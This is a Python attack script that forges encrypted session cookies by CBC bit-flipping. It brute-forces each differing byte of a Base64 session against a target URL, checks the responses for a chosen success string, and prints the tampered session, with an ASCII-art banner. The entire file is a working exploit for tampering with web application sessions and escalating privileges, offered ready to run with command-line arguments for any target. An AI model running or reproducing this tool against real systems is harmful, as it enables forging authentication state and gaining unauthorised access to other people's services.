#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)
import base64
import argparse
import requests
import time


BLOCK_SIZE = 16

def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "CBC bit-flipping script with old/new plaintext comparison, "
            "0..255 brute force for each differing byte, searching for a user-defined success substring in the response."
        )
    )
    parser.add_argument("--url", required=True,
                        help="Target URL (e.g. http://127.0.0.1:9091/read)")
    parser.add_argument("--session", required=True,
                        help="Original session (Base64 encoded)")
    parser.add_argument("--old", required=True,
                        help="The 'old' plaintext guess (must match server's actual plaintext).")
    parser.add_argument("--new", required=True,
                        help="The 'new' plaintext you want to achieve (same length as --old).")
    parser.add_argument("--param", action="append", nargs=2, metavar=("KEY", "VALUE"),
                        help="Extra GET params, e.g. --param filename test.txt (repeatable)")
    parser.add_argument("--delay", type=float, default=0.1,
                        help="Delay (seconds) between requests to avoid 429. Default=0.1")
    parser.add_argument("--success-substring", required=True,
                        help="If this substring appears in the response body, we consider it a success candidate.")
    return parser.parse_args()


def send_request_with_cookie(url, session_b64, extra_params=None):
    cookies = {
        "session": session_b64
    }
    try:
        resp = requests.get(url, params=extra_params, cookies=cookies, timeout=5)
        return resp.text, resp.status_code
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None, 0


def flip_byte(raw_iv_cipher, offset, new_value):
    arr = bytearray(raw_iv_cipher)
    arr[offset] = new_value
    return bytes(arr)


def cbc_flip_boom(url, orig_session_b64, old_plain, new_plain, extra_params, delay, success_substring):
    if len(old_plain) != len(new_plain):
        print("[!] Error: --old and --new must be the SAME length!")
        return

    raw_iv_cipher = base64.b64decode(orig_session_b64)
    if len(raw_iv_cipher) < BLOCK_SIZE:
        print("[!] Error: raw session too short or invalid base64?")
        return

    old_bytes = old_plain.encode("utf-8")
    new_bytes = new_plain.encode("utf-8")
    length = len(old_bytes)

    for i in range(length):
        if old_bytes[i] == new_bytes[i]:
            continue

        block_num = i // BLOCK_SIZE
        offset_in_block = i % BLOCK_SIZE
        if block_num == 0:
            overall_offset = offset_in_block
        else:
            overall_offset = BLOCK_SIZE + (block_num - 1)*BLOCK_SIZE + offset_in_block

        old_char = old_bytes[i]
        new_char = new_bytes[i]

        print(f"\n[+] Byte {i}: old=0x{old_char:02x}, new=0x{new_char:02x}. Starting 0..255 brute force...")

        possible_candidates = []

        for candidate in range(256):
            original_raw = raw_iv_cipher

            modified = flip_byte(raw_iv_cipher, overall_offset, candidate)
            test_session_b64 = base64.b64encode(modified).decode()

            resp_text, status_code = send_request_with_cookie(url, test_session_b64, extra_params)
            time.sleep(delay)

            #print(resp_text)

            if resp_text and success_substring in resp_text:
                # 找到成功关键字 => 视为可行
                short_resp = resp_text[:60].replace("\n","\\n")
                possible_candidates.append((candidate, status_code, short_resp, test_session_b64))

            raw_iv_cipher = original_raw

        if not possible_candidates:
            print(f"[-] Byte {i}: none of 256 candidates produced a response containing '{success_substring}'.")
            print("[-] Exploit failed or no success match. Exiting.")
            return
        else:
            print(f"[!] Found {len(possible_candidates)} candidate(s) whose response contained '{success_substring}':")
            for cand, scode, snippet, b64_cookie in possible_candidates:
                print(f"    candidate=0x{cand:02x}, status={scode}, resp={snippet!r}")
                print(f"       session={b64_cookie}")

            # 默认取 possible_candidates[0] 作为最终翻转写回
            chosen_candidate, chosen_scode, chosen_resp, chosen_session = possible_candidates[0]
            raw_iv_cipher = base64.b64decode(chosen_session)
            print(f"[+] Byte {i}: We'll choose candidate=0x{chosen_candidate:02x} to proceed. status={chosen_scode}")

    final_session_b64 = base64.b64encode(raw_iv_cipher).decode()
    print("\n[+] All differing bytes done. Checking final result with the server...")

    final_resp, final_status = send_request_with_cookie(url, final_session_b64, extra_params)
    time.sleep(delay)

    print(f"[+] Final status code: {final_status}")
    print(f"[+] Final response:\n{final_resp}")
    print("[!] The final tampered session(Base64) is:")
    print(final_session_b64)


def main():

    green_text_start = "\033[92m"
    green_text_end = "\033[0m"

    ascii_art=r"""
           _                _          _                     _        
          / /\             /\ \       /\ \                  /\_\      
         / /  \            \ \ \     /  \ \                / / /  _   
        / / /\ \           /\ \_\   / /\ \_\              / / /  /\_\ 
       / / /\ \ \         / /\/_/  / / /\/_/     ____    / / /__/ / / 
      / / /\ \_\ \       / / /    / / / ______ /\____/\ / /\_____/ /  
     / / /\ \ \___\     / / /    / / / /\_____\\/____\// /\_______/   
    / / /  \ \ \__/    / / /    / / /  \/____ /       / / /\ \ \      
   / / /____\_\ \  ___/ / /__  / / /_____/ / /       / / /  \ \ \     
  / / /__________\/\__\/_/___\/ / /______\/ /       / / /    \ \ \    
  \/_____________/\/_________/\/___________/        \/_/      \_\_\  

                                                                                                                                                                 
"""
    print(green_text_start+ascii_art+green_text_end)

    args = parse_args()

    extra_params = {}
    if args.param:
        for k, v in args.param:
            extra_params[k] = v

    cbc_flip_boom(
        url=args.url,
        orig_session_b64=args.session,
        old_plain=args.old,
        new_plain=args.new,
        extra_params=extra_params,
        delay=args.delay,
        success_substring=args.success_substring
    )


if __name__ == "__main__":
    main()